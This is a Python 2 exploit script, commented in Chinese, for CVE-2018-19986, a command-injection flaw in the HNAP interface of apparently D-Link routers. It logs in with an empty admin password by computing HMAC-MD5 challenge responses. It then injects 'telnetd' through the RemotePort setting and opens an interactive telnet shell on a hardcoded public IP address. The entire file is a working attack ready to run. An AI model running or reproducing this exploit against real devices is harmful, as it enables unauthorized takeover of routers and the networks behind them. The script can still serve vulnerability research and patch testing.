import requests
import telnetlib
from hashlib import md5
import time
import math

trans_5C = "".join(chr(x ^ 0x5c) for x in xrange(256))
trans_36 = "".join(chr(x ^ 0x36) for x in xrange(256))
blocksize = md5().block_size

def hmac_md5(key, msg):
    if len(key) > blocksize:
        key = md5(key).digest()
    key += chr(0) * (blocksize - len(key))
    o_key_pad = key.translate(trans_5C)
    i_key_pad = key.translate(trans_36)
    return md5(o_key_pad + md5(i_key_pad + msg).digest())

def HNAP_AUTH(SOAPAction, privateKey):
    b = math.floor(int(time.time())) % 2000000000
    b = str(b)[:-2]
    h = hmac_md5(privateKey, b + '"http://purenetworks.com/HNAP1/' + SOAPAction + '"').hexdigest().upper()
    return h + " " + b

#输入IP和admin口令，通过读hnap_main的二进制，理解初始状态admin的口令为空（public_key_0：0代表空值）
IP = '1.162.54.148'
adminPw = ''

command = "telnetd" # command injection id

headers = requests.utils.default_headers()
headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
headers["SOAPAction"] = '"http://purenetworks.com/HNAP1/Login"'
headers["Origin"] = "http://" + IP
headers["Referer"] = "http://" + IP + "/info/Login.html"
headers["Content-Type"] = "text/xml; charset=UTF-8"
headers["X-Requested-With"] = "XMLHttpRequest"

#构造一个action为request的请求发送给Login
payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>Admin</Username><LoginPassword></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'
r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload)
data = r.text

#通过获取的publickey计算privatekey，根据privatekey计算口令的hmac(在上文中对应的是hmac_1)
challenge = str(data[data.find("<Challenge>") + 11: data.find("</Challenge>")])
cookie = data[data.find("<Cookie>") + 8: data.find("</Cookie>")]
publicKey = str(data[data.find("<PublicKey>") + 11: data.find("</PublicKey>")])
privateKey = hmac_md5(publicKey + adminPw, challenge).hexdigest().upper()
password = hmac_md5(privateKey, challenge).hexdigest().upper()

#构造action为login的请求，发送用户名和口令
headers["HNAP_AUTH"] = HNAP_AUTH("Login", privateKey)
headers["Cookie"] = "uid=" + cookie
payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>login</Action><Username>Admin</Username><LoginPassword>'+password+'</LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'
r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload)

#登录成功后访问SetRouterSettings设置路由器的一些配置，其中RemotePort被设置为command
headers["Origin"] = "http://" + IP
headers["HNAP_AUTH"] = HNAP_AUTH("SetRouterSettings", privateKey)
headers["SOAPaction"] = '"http://purenetworks.com/HNAP1/SetRouterSettings"'
headers["Accept"] = "text/xml"

payload = open('{}.xml'.format("CVE-2018-19986")).read().replace('ip', IP).replace('COMMAND', command)
print '[*] command injection'
r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload)
print(r.text)

print '[*] waiting 30 sec...'
time.sleep(30)

#利用成功之后，服务端已经开启了Telnet服务，攻击者可直接连服务器的Telnet
print '[*] enjoy your shell'
telnetlib.Telnet(IP).interact()